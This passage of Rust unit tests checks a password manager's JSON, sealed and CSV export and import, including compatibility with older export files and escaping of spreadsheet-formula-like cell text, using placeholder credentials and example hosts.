            security_code: "737".into(),
        }
        .apply(&mut card);
        vault.add_item(&card).unwrap();
        let mut ssh = ItemData::new(ItemKind::SshKey, "Test server");
        ssh.username = "deploy".into();
        ssh.password = "test private key".into();
        ssh.urls = vec!["https://server.example".into()];
        ssh.custom_fields.push(CustomField {
            name: vault_core::ssh::PUBLIC_KEY_FIELD.into(),
            value: "ssh-ed25519 AAAA test".into(),
            sensitive: false,
        });
        // The key's own, and one the person added for the server.
        for value in ["SHA256:test", "SHA256:the server's own"] {
            ssh.custom_fields.push(CustomField {
                name: vault_core::ssh::FINGERPRINT_FIELD.into(),
                value: value.into(),
                sensitive: false,
            });
        }
        vault.add_item(&ssh).unwrap();
        // A note that came with a password (from a CSV, or once a login).
        let mut note = ItemData::new(ItemKind::SecureNote, "Test note");
        note.username = "me".into();
        note.password = "a note's password".into();
        note.totp = "JBSWY3DPEHPK3PXP".into();
        note.urls = vec!["https://one.example".into(), "https://two.example".into()];
        note.notes = "text".into();
        vault.add_item(&note).unwrap();
        let mut history = ItemData::login("Test login", "me", "now", "https://login.example");
        history.notes = "first line\nsecond: line".into();
        vault.add_item(&history).unwrap();

        let json = export_json(&vault).unwrap();
        // No room to grow: nothing of it was left behind in a smaller buffer.
        assert_eq!(json.capacity(), json.len());
        let sealed = export_sealed(&vault, "a long password for the file").unwrap();
        for report in [
            import_json(json.as_bytes()).unwrap(),
            crate::import(
                &sealed,
                crate::Format::Sealed,
                "a long password for the file",
                None,
            )
            .unwrap(),
        ] {
            assert!(report.warnings.is_empty(), "{:?}", report.warnings);
            for title in [
                "Test card",
                "Test server",
                "Test note",
                "Test login",
                "Gmail",
            ] {
                let back = report.items.iter().find(|i| i.title == title).unwrap();
                let (back, original) = (contents(back), contents(&titled(&vault, title)));
                assert_eq!(back.kind, original.kind, "{title}");
                assert_eq!(back.username, original.username, "{title}");
                assert_eq!(back.password, original.password, "{title}");
                assert_eq!(back.urls, original.urls, "{title}");
                assert_eq!(back.totp, original.totp, "{title}");
                assert_eq!(back.notes, original.notes, "{title}");
                assert_eq!(back.custom_fields, original.custom_fields, "{title}");
                assert_eq!(back.recovery_codes, original.recovery_codes, "{title}");
            }
            // Read back into the vault it came from, everything is already there.
            let outcome = report.preview(&vault).unwrap();
            assert_eq!((outcome.added, outcome.duplicates), (0, vault.len()));
        }
        // And counted: five passwords (with the PIN, the key and the note's), two code secrets.
        let in_clear = export_report(&vault, ExportFormat::Json).unwrap().in_clear;
        assert_eq!((in_clear.passwords, in_clear.otp_secrets), (5, 2));
        assert_eq!(in_clear.notes, 3);
        let csv = export_csv(&vault).unwrap();
        let report = import_csv(csv.as_bytes()).unwrap();
        let passwords = report.items.iter().filter(|i| !i.password.is_empty());
        assert_eq!(passwords.count(), 5);
    }

    #[test]
    fn protected_exports_made_before_still_import() {
        // As the app wrote them: no `recoveryCodes`, `leftOut` or `passwordRevisionDate`; a
        // card's details as fields, its PIN as the code.
        let older = r#"{"encrypted": false, "folders": [{"id": "f1", "name": "Google"}], "items": [
          {"id": "item-0", "folderId": "f1", "type": 1, "reprompt": 1, "name": "Gmail", "notes": null,
           "favorite": true, "creationDate": "2026-01-02T03:04:05.000Z", "revisionDate": "2026-01-02T03:04:05.000Z",
           "fields": [{"name": "Recovery codes", "value": "aaaa (used)\nbbbb", "type": 1}],
           "login": {"uris": [{"match": null, "uri": "https://mail.example"}], "username": "me",
                     "password": "pw", "totp": null}},
          {"id": "item-1", "folderId": null, "type": 3, "reprompt": 0, "name": "Visa", "notes": null,
           "favorite": false, "creationDate": "2026-01-02T03:04:05.000Z", "revisionDate": "2026-01-02T03:04:05.000Z",
           "fields": [{"name": "Number", "value": "4111111111111111", "type": 1},
                      {"name": "Expiry", "value": "08/29", "type": 0},
                      {"name": "Security code", "value": "737", "type": 1},
                      {"name": "Brand", "value": "Visa", "type": 0}],
           "card": {"cardholderName": "A HOLDER", "code": "4821"}},
          {"id": "item-2", "folderId": null, "type": 3, "reprompt": 0, "name": "No PIN", "notes": null,
           "favorite": false, "creationDate": "2026-01-02T03:04:05.000Z", "revisionDate": "2026-01-02T03:04:05.000Z",
           "fields": [], "card": {"cardholderName": "A HOLDER", "code": null}}
        ]}"#;
        let sealed =
            vault_core::sealed_export::seal("a long password for the file", older.as_bytes())
                .unwrap();
        let report = crate::import(
            &sealed,
            crate::Format::Sealed,
            "a long password for the file",
            None,
        )
        .unwrap();
        assert!(report.warnings.is_empty(), "{:?}", report.warnings);
        assert_eq!(report.items.len(), 3);
        let gmail = &report.items[0];
        assert_eq!(report.folders[0].as_deref(), Some("Google"));
        assert!(gmail.reprompt && gmail.favorite && gmail.password == "pw");
        // Never guessed at: the hidden text stays the hidden text it was.
        assert!(gmail.recovery_codes.is_empty());
        assert_eq!(gmail.custom_fields[0].value, "aaaa (used)\nbbbb");
        assert!(gmail.custom_fields[0].sensitive);
        // The PIN is the PIN again, not a second security code.
        let visa = &report.items[1];
        assert_eq!(visa.password, "4821");
        let details = vault_core::card::CardDetails::from_item(visa);
        assert_eq!(
            (details.number.as_str(), details.security_code.as_str()),
            ("4111111111111111", "737")
        );
        assert_eq!(visa.custom_fields.len(), 4);
        assert_eq!(report.items[2].password, "");
    }

    #[test]
    fn text_that_looks_like_a_marked_cell_comes_back_as_it_was() {
        for text in ["=1+1", "'=1+1", "''=1+1", "'quoted'", "plain", "-", "'", ""] {
            assert_eq!(from_text(as_text(text.to_owned())), text);
            assert!(!as_text(text.to_owned()).starts_with(FORMULA_STARTS));
        }
    }

    #[test]
    fn the_plain_json_keeps_codes_for_other_managers_and_names_what_it_leaves_out() {
        let vault = full_vault();
        let json = export_json(&vault).unwrap();
        let document: Value = serde_json::from_str(&json).unwrap();
        let items = document["items"].as_array().unwrap();
        // Other managers read the codes as a hidden field; no earlier passwords in clear.
        let gmail = items.iter().find(|i| i["name"] == "Gmail").unwrap();
        assert!(
            gmail["fields"]
                .as_array()
                .unwrap()
                .iter()
                .any(|f| f["name"] == RECOVERY_CODES_FIELD && f["type"] == 1)
        );
        assert!(!json.contains("first password"));
        assert!(items.iter().all(|i| i.get("passwordHistory").is_none()));

        let report = import_json(json.as_bytes()).unwrap();
        let back = report.items.iter().find(|i| i.title == "Gmail").unwrap();
        assert_eq!(back.recovery_codes, titled(&vault, "Gmail").recovery_codes);
        assert!(
            !back
                .custom_fields
                .iter()
                .any(|f| f.name == RECOVERY_CODES_FIELD)
        );
        assert!(report.warnings.contains(
            &"\"Mail\": 1 attached file, 1 passkey and 1 earlier password were not in this export; they are only in the vault it was made from".to_owned()
        ), "{:?}", report.warnings);
    }
}
